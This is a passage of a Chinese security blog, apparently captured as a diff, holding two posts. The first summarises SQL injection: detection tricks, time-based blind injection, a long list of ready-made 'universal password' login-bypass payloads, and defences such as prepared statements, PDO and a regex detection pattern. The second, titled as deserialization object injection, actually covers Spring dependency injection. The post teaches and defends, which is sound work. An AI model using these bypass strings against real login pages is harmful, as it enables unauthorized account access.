-    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h2 id="什么是-Sql-注入？"><a href="#什么是-Sql-注入？" class="headerlink" title="什么是 Sql 注入？"></a>什么是 Sql 注入？</h2><p>SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。</p>
-<p>由于以下的环境都是 MySQL 数据库，所以先了解点 MySQL 有关的知识。在 MySQL5.0 之后，MySQL 中默认添加了一个名为<code>information_schema</code>​的数据库，<u>该数据库中的表都是</u>​<u><strong>只读的</strong></u>​<u>，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个</u>​<u><strong>视图</strong></u>​<u>，不是</u>​<u><strong>基本表</strong></u>​<u>，</u>​<u><strong>没有关联的文件</strong></u>​<u>。</u></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql中注释符：#   、/**/ 、  --</span><br></pre></td></tr></table></figure>
-
-<h4 id="information-schema-中三个很重要的表："><a href="#information-schema-中三个很重要的表：" class="headerlink" title="information_schema 中三个很重要的表："></a>information_schema 中三个很重要的表：</h4><ul>
-<li>information_schema.<strong>schemata</strong>: 该数据表存储了 mysql 数据库中的所有数据库的<code>库名</code>​</li>
-<li>information_schema.<strong>tables</strong>： 该数据表存储了 mysql 数据库中的所有数据表的<code>表名</code>​</li>
-<li>information_schema.<strong>columns</strong>: 该数据表存储了 mysql 数据库中的所有列的<code>列名</code>​</li>
-</ul>
-<h2 id="Mysql-中常用的函数"><a href="#Mysql-中常用的函数" class="headerlink" title="Mysql 中常用的函数"></a>Mysql 中常用的函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="判断-SQL-注入是否存在"><a href="#判断-SQL-注入是否存在" class="headerlink" title="判断 SQL 注入是否存在"></a>判断 SQL 注入是否存在</h2><ul>
-<li>先加单引号<code>&#39;</code>​、双引号<code>&quot;</code>​、单括号<code>)</code>​、双括号<code>))</code>​等看看是否<strong>报错</strong>，如果报错就可能存在 SQL 注入漏洞了。</li>
-<li>还有在 URL 后面加<code>and 1 = 1 、 and 1 = 2</code>​看页面是否显示一样，<strong>显示不一样</strong>的话，肯定存在 SQL 注入漏洞了。</li>
-<li>还有就是<code>Timing Attack</code>​测试，也就是<code>时间盲注</code>​。有时候通过简单的条件语句比如 <strong>and 1&#x3D;2</strong> 是无法看出异常的。</li>
-<li>在 MySQL 中，有一个<code>Benchmark()</code>​函数，它是用于<strong>测试性能</strong>的。<u>Benchmark(count,expr)，这个函数执行的结果，是将</u>​<u><strong>表达式expr执行count次</strong></u>​<u> 。</u></li>
-</ul>
-<p>因此，利用<code>benchmark函数</code>​，<u>可以让</u>​<u><strong>同一个函数执行若干次</strong></u>​<u>，使得结果返回的时间比平时要长，通过</u>​<u><strong>时间长短</strong></u>​<u>的变化，可以判断注入语句是否执行成功。</u>这是一种<strong>边信道攻击</strong>，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是<code>时间盲注</code>​。</p>
-<p><strong>易出现 SQL 注入的功能点：</strong> 凡是和<code>数据库有交互</code>​的地方都容易出现 SQL 注入，SQL 注入经常出现在登陆页面、涉及获取 HTTP 头（<strong>user-agent &#x2F; client-ip</strong> 等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在 HTTP 头中的 <strong>client-ip</strong> 和 <strong>x-forward-for</strong> 等字段处。这些字段是用来记录<strong>登陆的 ip</strong> 的，有可能会被<strong>存储进数据库</strong>中从而与数据库发生交互导致 sql 注入。</p>
-<h2 id="Sql-注入的分类"><a href="#Sql-注入的分类" class="headerlink" title="Sql 注入的分类"></a>Sql 注入的分类</h2><hr>
-<table>
-<thead>
-<tr>
-<th>分类依据</th>
-<th>类型</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>获取信息的方式</td>
-<td>布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等</td>
-</tr>
-<tr>
-<td>提交方式</td>
-<td>GET、POST、COOKIE、HTTP 注入等</td>
-</tr>
-<tr>
-<td>注入点类型</td>
-<td>数字类型的注入、字符串类型的注入、搜索型注入等</td>
-</tr>
-<tr>
-<td>其他注入</td>
-<td>二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原验证登陆语句:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>输入<code>1&#39; or 1=1 or &#39;1&#39;=&#39;1</code>​万能密码语句变为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>即得到优先级关系：<code>or&lt;and&lt;not</code>​，同一优先级默认从左往右计算。</p>
-<ul>
-<li>上面<code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​,因为密码是我们乱输入的。(此处是假)</li>
-<li>Username=‘1’ 返回假，数据库没有1这个用户名(此处是假)</li>
-<li>1=1返回真(此处是真)</li>
-</ul>
-<p>以上的结果是:<code>假 or 真 or假</code>​返回<code>真</code>​。验证通过。再比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select tel,pwd where tel=&#x27;111&#x27; and pwd=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>我们把电话111看成一个变量，输入电话号码为<code>&#39; or 1= &#39;1</code>​。</p>
-<p>sql就变为如下样子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  tel,pwd where tel=&#x27;&#x27; or 1=&#x27;1&#x27; and pwd=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>上面<code>1=&#39;1&#39; and pwd=&#39;123456&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​。(此处是假)</li>
-<li>tel=‘’ 返回假，数据库没有<code>&#39;&#39;</code>​这个手机号。(此处是假)</li>
-</ul>
-<p>以上的结果是:<code>真 or假</code>​返回<code>真</code>​。验证通过。</p>
-<h3 id="常用的万能密码"><a href="#常用的万能密码" class="headerlink" title="常用的万能密码"></a>常用的万能密码</h3><hr>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="Sql-注入的预防"><a href="#Sql-注入的预防" class="headerlink" title="Sql 注入的预防"></a>Sql 注入的预防</h2><p><u>一般在项目中我们不太会去注意 SQL 注入的问题</u>，因为我们会使用 <strong>ORM</strong>，而 ORM 在实现的过程中也会帮我做 SQL 注入过滤；但有的时候 ORM 没法满足我们的需求，这时可能就会手撸原生 SQL 来执行</p>
-<h3 id="预编译-PreparedStatement-JSP"><a href="#预编译-PreparedStatement-JSP" class="headerlink" title="预编译(PreparedStatement)(JSP)"></a>预编译(PreparedStatement)(JSP)</h3><hr>
-<p>可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select id, no from user where id=?&quot;;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">ps.setInt(1, id);</span><br><span class="line">ps.executeQuery();</span><br></pre></td></tr></table></figure>
-
-<p>如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？</p>
-<p>其原因就是：采用了PreparedStatement预编译，就会将SQL语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会<strong>影响该SQL语句的语法结构了</strong>，因为<strong>语法分析已经完成了</strong>，而语法分析<strong>主要是分析SQL命令</strong>，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面<strong>输入了这些SQL命令</strong>，<strong>也不会被当成SQL命令来执行了</strong>，因为这些SQL命令的执行， 必须先通过<strong>语法分析</strong>，生成<strong>执行计划</strong>，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，只会被当做字符串字面值参数。所以SQL语句<strong>预编译</strong>可以有效防御SQL注入。</p>
-<p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。</p>
-<h3 id="PDO（PHP）"><a href="#PDO（PHP）" class="headerlink" title="PDO（PHP）"></a>PDO（PHP）</h3><p>首先简单介绍一下什么是<strong>PDO</strong>。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组<strong>数据库抽象层</strong>API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。</p>
-<p>PDO对于解决SQL注入的原理也是<strong>基于预编译</strong>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );</span><br><span class="line">$data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br></pre></td></tr></table></figure>
-
-<p>实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了<strong>占位符的方式</strong>，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以<strong>防止传那些危险变量</strong>改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行.</p>
-<h3 id="使用正则表达式过滤"><a href="#使用正则表达式过滤" class="headerlink" title="使用正则表达式过滤"></a>使用正则表达式过滤</h3><p>正则表达式是一种用于匹配模式的工具，在检测 SQL 注入时非常有用。我们可以使用正则表达式来过滤和验证用户输入，以确保输入不包含任何恶意的 SQL 代码。下面是一些常见的正则表达式示例：</p>
-<p>对用户输入的特殊字符进行严格过滤，如 ‘、”、&lt;、&gt;、&#x2F;、*、;、+、-、&amp;、|、(、)、and、or、select、union</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(</span><br><span class="line">r&quot;(%27)|(\&#x27;)|(\-\-)|(%23)|(#)|&quot;  # Regex for detection of SQL meta-characters</span><br><span class="line">r&quot;\w*((%27)|(\&#x27;))\s+((%6F)|o|(%4F))((%72)|r|(%52))\s*|&quot;  # Modified regex for detection of SQL meta-characters eg: &#x27; or 1 = 1&#x27; detect word &#x27;or&#x27;,</span><br><span class="line">r&quot;((%3D)|(=))[^\n]*((%27)|(\&#x27;)|(\-\-)|(%3B)|(;))&quot;  # Regex for typical SQL Injection attack eg: &#x27;= 1 --&#x27;</span><br><span class="line">r&quot;((%27)|(\&#x27;))union|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))select|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))insert|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))update|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))drop&quot;,  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">re.IGNORECASE,</span><br><span class="line">)</span><br><span class="line">r = pattern.search(&quot;&#x27; OR 1 -- -&quot;)</span><br><span class="line">if r:</span><br><span class="line">return True</span><br></pre></td></tr></table></figure>
-
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Web 应用中用于<strong>连接数据库的用户</strong>与<strong>数据库的系统管理员用户</strong>的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库。</p>
-<p>设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</p>
-<p>严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</p>
-<p>使用 Web 应用防火墙。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="cmawb0xv4000q747k04fx1fsl" data-title="SQL注入总结" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/反序列化/反序列化详解/对象注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/">反序列化对象注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h1><h3 id="一，实现方式的使用"><a href="#一，实现方式的使用" class="headerlink" title="一，实现方式的使用"></a>一，实现方式的使用</h3><p>对象注入也可被称为对象装配，是把Bean对象获取出来放到某个类中。</p>
-<p>对象注入的实现方式有3种，分别为<strong>属性注入</strong>，<strong>Setter注入</strong>和<strong>构造方法注入</strong>。</p>
-<p>为了更好地理解对象注入的实现方式，搞个实例来具体说明：</p>
-<h4 id="1-0，前期准备"><a href="#1-0，前期准备" class="headerlink" title="1.0，前期准备"></a>1.0，前期准备</h4><p><strong>1，准备Service类</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class StudentService &#123;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student service sayHi()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>示例问题：将 Service 类注入到 Controller 类中，对象注入实现：</p>
-<h4 id="1-1，属性注入"><a href="#1-1，属性注入" class="headerlink" title="1.1，属性注入"></a>1.1，属性注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    //注入方式：属性注入</span><br><span class="line">    @Autowired</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>3，启动类执行结果：</strong></p>
-<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
-<h4 id="1-2，Setter注入"><a href="#1-2，Setter注入" class="headerlink" title="1.2，Setter注入"></a>1.2，Setter注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    @Autowired</span><br><span class="line">    public void setStudentService(StudentService studentService) &#123;</span><br><span class="line">        this.studentService = studentService;</span><br><span class="line">    &#125;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2，启动类实现代码：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //1，获取Spring上下文</span><br><span class="line">        ApplicationContext applicationContext =</span><br><span class="line">                new ClassPathXmlApplicationContext(<span class="string">&quot;spring-config.xml&quot;</span>);</span><br><span class="line">        //2,得到Bean对象</span><br><span class="line">        StudentController studentController =</span><br><span class="line">                applicationContext.getBean(<span class="string">&quot;studentController&quot;</span>,StudentController.class);</span><br><span class="line">        //3,使用Bean对象</span><br><span class="line">        studentController.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>3，启动类执行结果：</strong></p>
-<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
-<h4 id="1-3，构造方法注入"><a href="#1-3，构造方法注入" class="headerlink" title="1.3，构造方法注入"></a>1.3，构造方法注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    @Autowired</span><br><span class="line">    public StudentController(StudentService studentService) &#123;</span><br><span class="line">        this.studentService = studentService;</span><br><span class="line">    &#125;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2，启动类实现代码：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //1，获取Spring上下文</span><br><span class="line">        ApplicationContext applicationContext =</span><br><span class="line">                new ClassPathXmlApplicationContext(<span class="string">&quot;spring-config.xml&quot;</span>);</span><br><span class="line">        //2,得到Bean对象</span><br><span class="line">        StudentController studentController =</span><br><span class="line">                applicationContext.getBean(<span class="string">&quot;studentController&quot;</span>,StudentController.class);</span><br><span class="line">        //3,使用Bean对象</span><br><span class="line">        studentController.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>3，启动类执行结果：</strong></p>
-<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
-<hr>
-<h3 id="二，方式的优缺点分析"><a href="#二，方式的优缺点分析" class="headerlink" title="二，方式的优缺点分析"></a>二，方式的优缺点分析</h3><h4 id="2-1，属性注入"><a href="#2-1，属性注入" class="headerlink" title="2.1，属性注入"></a>2.1，属性注入</h4><p><strong>1，方式实现代码：</strong></p>
-<p><img src="/.com//image-20250519113909-9naesmp.png" alt="image"></p>
-<p><strong>2，方式优点：</strong></p>
-<ul>
-<li>实现简单，易于理解和维护</li>
-</ul>
-<p><strong>3，方式缺点：</strong></p>
-<ul>
-<li>不能注入不可变对象【final 修饰的变量】</li>
-<li>通用性差，只适用于IoC容器，在非IoC框架中无效</li>
-<li>更容易违背单一设计原则</li>
-</ul>
-<h4 id="2-2，Setter注入"><a href="#2-2，Setter注入" class="headerlink" title="2.2，Setter注入"></a>2.2，Setter注入</h4><p><strong>1，方式实现代码：</strong></p>
-<p><img src="/.com//image-20250519114004-n40tgzk.png" alt="image"></p>
-<p><strong>2，方式优点：</strong></p>
-<ul>
-<li>符合单一设计原则【每个方法只传递一个对象】</li>
-</ul>
-<p><strong>3，方式缺点：</strong></p>
-<ul>
-<li>不能注入不可变对象【final 修饰的变量】</li>
-<li>使用Setter注入的对象可能被修改</li>
-</ul>
-<h4 id="2-3，构造方法注入"><a href="#2-3，构造方法注入" class="headerlink" title="2.3，构造方法注入"></a>2.3，构造方法注入</h4><p><strong>1，方式实现代码：</strong></p>
-<p><img src="/.com//image-20250519114010-b66tqw9.png" alt="image"></p>
-<p>注意：如果只有一个构造方法，那么 @Autowired 注解可以省略。</p>
-<p><strong>2，方式优点：</strong></p>
-<p>可以注入不可变对象【final 修饰的变量】</p>
-<p>注入对象不会被改变【构造方法只执行一次】</p>
-<p>注入对象会完全被初始化</p>
-<p>通用性更好，可在IoC容器中使用，也可在非IoC中使用</p>
-<p><strong>3，方式缺点：</strong></p>
-<p>不符合单一设计原则【每个方法可传递多个对象】</p>
-<hr>
